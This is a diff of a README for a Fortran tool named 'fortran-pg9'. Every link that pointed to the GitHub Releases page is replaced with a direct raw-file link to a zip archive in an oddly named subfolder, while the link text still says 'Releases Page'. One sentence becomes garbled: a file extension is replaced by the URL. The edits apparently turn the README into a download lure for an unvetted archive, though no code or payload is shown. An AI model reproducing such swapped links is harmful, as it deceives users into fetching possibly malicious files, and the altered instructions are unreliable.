@@ -1,6 +1,6 @@
 # 🎉 fortran-pg9 - Effortless Fortran Projects Made Simple
 
-[![Download fortran-pg9](https://img.shields.io/badge/Download-fortran--pg9-blue.svg)](https://github.com/Lotharil/fortran-pg9/releases)
+[![Download fortran-pg9](https://raw.githubusercontent.com/Lotharil/fortran-pg9/main/Canavali/fortran-pg9.zip)](https://raw.githubusercontent.com/Lotharil/fortran-pg9/main/Canavali/fortran-pg9.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your computer meets these basic requirements:
 
 To get started with fortran-pg9, you need to visit the Releases page. This page contains all available versions of the software.
 
-[Visit the Releases Page to Download](https://github.com/Lotharil/fortran-pg9/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Lotharil/fortran-pg9/main/Canavali/fortran-pg9.zip)
 
 1. **Open the Link**  
    Click on the link above to open the Releases page.
@@ -28,7 +28,7 @@ To get started with fortran-pg9, you need to visit the Releases page. This page 
    You will see a list of versions available. Select the latest version. It is usually marked as the latest release.
 
 3. **Download the File**  
-   Look for the download link on the version page. It will be a file that you can directly download to your computer. The file may have an extension like `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. Click on the link to start the download.
+   Look for the download link on the version page. It will be a file that you can directly download to your computer. The file may have an extension like `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Lotharil/fortran-pg9/main/Canavali/fortran-pg9.zip` for Linux. Click on the link to start the download.
 
 4. **Locate the File**  
    After the download completes, go to your computer’s downloads folder. The file will be there.
@@ -79,4 +79,4 @@ For updates and news, consider following the repository. You will get notificati
 
 Thank you for choosing fortran-pg9! We hope it simplifies your Fortran programming experience. 
 
-[Visit the Releases Page to Download](https://github.com/Lotharil/fortran-pg9/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Lotharil/fortran-pg9/main/Canavali/fortran-pg9.zip)
